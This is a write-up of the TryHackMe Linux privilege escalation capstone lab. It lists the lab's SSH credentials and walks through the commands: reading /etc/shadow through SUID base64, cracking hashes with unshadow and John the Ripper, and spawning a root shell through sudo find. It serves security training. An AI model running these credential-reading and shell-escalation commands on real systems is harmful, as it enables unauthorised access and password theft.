# THM Capstone Challenge

First of all, what it may look a simple 10 min walktrhough this took me about 5h to complete with a lot try and error Priviledge Escalation techiniques. Before reading this write-up, make sure you understand all the key concepts and try to cover every technique mentioned in the Linux Privilege Escalation TryHackMe section

Let's dive in!

By now you have a fairly good understanding of the main privilege escalation vectors on Linux and this challenge should be fairly easy.

You have gained SSH access to a large scientific facility. Try to elevate your privileges until you are Root.\
We designed this room to help you build a thorough methodology for Linux privilege escalation that will be very useful in exams such as OSCP and your penetration testing engagements.

Leave no privilege escalation vector unexplored, privilege escalation is often more an art than a science.

You can access the target machine over your browser or use the SSH credentials below.

* Username: leonard
* Password: Penny123

### What is the content of the flag1.txt file?

**Step 1: Look for any files with SUID or SGID bits set**

We have enough privileges to get `/etc/passwd` but we can't do the same for the `/etc/shadow`.&#x20;

To bypass this, we'll look for any files that have SUID or SGID bits set with the command:

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>

The `/usr/bin/base64` has an exploit available at [GTFOBins](https://gtfobins.github.io/gtfobins/base64/)&#x20;

```bash
LFILE=/etc/shadow
/usr/bin/base64 "$LFILE" | base64 --decode
```

<figure><img src="../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

**Step 2. Unshadow and crack the hash**

Now we copy both `/etc/passwd` and `/etc/shadow` to the attacker machine and use unshadow to create a crakable file for John the Ripper:

<figure><img src="../../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>

With both files in the same directory run the following command:

```bash
unshadow passwd.txt shadow.txt > passwords.txt
```

And then use John the Ripper to Crack the hash:

```bash
john passwords.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

**Step 3: Login with missy and find the flag**

SSH to the machine with missy credentials and get the flag under /home/missy/Documents

<figure><img src="../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

### What is the content of the flag2.txt file?

**Step 1: Enumerate the priviledges of both users**

You might have noticed the under the /home directory there is a folder called rootflag, but we can't access it.

<figure><img src="../../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>

Run the command on both users

```bash
sudo -l
```

<figure><img src="../../.gitbook/assets/image (100).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (101).png" alt=""><figcaption></figcaption></figure>

As we can see from the output above, not only we can use the `sudo -l` command with missy user, and we can even run `find` with sudo without specifying a password.&#x20;



**Step 2: Look for an exploit on GTFOBins**

There is a exploit avaiblale on [GTFOBins](https://gtfobins.github.io/gtfobins/find/) that we can use to elevate the priviledges of the current user:

<figure><img src="../../.gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>

**Step 3: Escalate the priviledges**

```bash
sudo /usr/bin/find . -exec /bin/sh \; -quit
```

<figure><img src="../../.gitbook/assets/image (103).png" alt=""><figcaption></figcaption></figure>

Privildge Escalation done successfully! Now let's get that flag!

<figure><img src="../../.gitbook/assets/image (104).png" alt=""><figcaption></figcaption></figure>

And we got it!



This was a super fun and exciting challenge. It really puts to the test your knowledge of Linux Privilege Escalation. Make sure you always take notes during your engagements, this will keep your workflow organized and help you during the enumeration process. Good luck, and remember that continuous learning and practice are key to mastering these skills. Embrace each challenge as an opportunity to grow and enhance your expertise in the field!
